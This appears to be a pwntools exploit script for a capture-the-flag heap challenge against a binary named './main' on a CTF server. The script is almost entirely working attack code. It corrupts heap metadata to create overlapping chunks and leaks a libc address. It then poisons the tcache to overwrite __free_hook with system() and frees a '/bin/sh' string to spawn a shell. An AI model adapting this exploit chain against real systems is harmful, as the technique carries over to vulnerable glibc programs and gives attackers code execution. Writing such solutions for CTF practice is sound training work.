#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host blackhat4-48ffe68c580ce33e6e65e8e4adea833b-0.chals.bh.ctf.sa --port 1234 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'blackhat4-48ffe68c580ce33e6e65e8e4adea833b-0.chals.bh.ctf.sa'
# host = args.HOST or 'localhost'
port = int(args.PORT or 12345)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    # io = remote(host, 443, ssl=True, sni=host)
    io = connect('localhost',1234)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def add(sz):
    io.sendlineafter(b"> ",b'1')
    io.sendlineafter(b"ze:\n",str(sz).encode())

def edit(idx,desc):
    io.sendlineafter(b"> ",b'2')
    io.sendlineafter(b":\n",str(idx).encode())
    io.sendafter(b":\n",str(desc))

def delete(idx):
    io.sendlineafter(b"> ",b'3')
    io.sendlineafter(b":\n",str(idx).encode())

def view(idx):
    io.sendlineafter(b"> ",b'4')
    io.sendlineafter(b":\n",str(idx).encode())
libc = exe.libc

add(0x500-8) #0 a
add(0xa00) #1 b
add(0x500) #2 c

add(0x100) #3
edit(1,b'\x00'*(0x9f0)+p64(0xa00))
# # for i in range(60):
# #     io.recvuntil(b'> ')
delete(1)
edit(0,'a'*(0x500-8))

add(0x500) #1 b1
edit(1,b'test b1')
add(0x20) #4 b2
edit(4,b'test b2')
# view(2)
delete(1)
delete(2)

add(0xc00) #1 c
# edit(1,'a'*(0xc00-0x6e0-0x10))

add(0xffffff) # 2

io.recvuntil("location ")

data = int(io.recvline()[:-1],16)
print (hex(data))
libc.address = data+ 0x1000ff0
print (hex(libc.address))
print (hex(libc.sym['system']))

add(0x20) # 5
delete(5)
# view(4)
delete(4)
p = 'a'*(0xc00-0x6e0-0x10-0x10)
p += p64(0)+p64(0x31)
p += p64(libc.sym['__free_hook'])
edit(1,p)

add(0x20)
add(0x20)
edit(5,p64(libc.sym['system']))
edit(3,'/bin/sh\x00')

delete(3)



io.interactive()

